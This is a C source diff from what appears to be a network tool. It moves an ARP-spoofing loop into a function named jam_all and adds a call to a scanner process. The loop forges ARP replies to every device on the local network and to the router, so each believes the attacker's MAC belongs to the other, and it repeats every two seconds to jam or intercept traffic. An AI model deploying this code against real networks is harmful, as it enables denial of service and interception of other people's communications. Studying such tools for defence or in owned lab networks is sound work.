@@ -3,6 +3,7 @@
 #include "./network.h"
 #include "./icmp.h"
 #include "./arp.h"
+#include "./process/scanner.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -35,6 +36,23 @@ bool get_ip_and_mask(const char *arg, uint32_t *ip, uint32_t *mask) {
     return ip_str_to_uint32(ip_str, ip) && parse_mask_length(mask_str, mask);
 }
 
+void jam_all(Network network, int sockfd, uint8_t *my_mac) {
+    Device *router = &network.devices[0];
+    uint32_t router_ip = htonl(router->ip);
+    while(1) {
+        for (size_t index = 1;index<network.device_count;index++) {
+            Device *device = &network.devices[index];
+
+            uint32_t device_ip = htonl(device->ip);
+            
+
+            arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
+            arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
+        }
+        sleep(2);
+    }
+}
+
 
 int main(int argc, char *argv[]){
     if (argc < 2) {
@@ -58,24 +76,9 @@ int main(int argc, char *argv[]){
 
     int sockfd = arp_create_socket();
     arp_scan_range(network, sockfd, "wlan0", my_mac, &ip);
-    print_network(network);
 
     printf("Devices alive %lu", network_count_alive(network));
-
-    Device *router = &network.devices[0];
-    uint32_t router_ip = htonl(router->ip);
-    while(1) {
-        for (size_t index = 1;index<network.device_count;index++) {
-            Device *device = &network.devices[index];
-
-            uint32_t device_ip = htonl(device->ip);
-            
-
-            arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
-            arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
-        }
-        sleep(2);
-    }
+    scanner_process(network);
     
     free_network(network);
     close(sockfd);
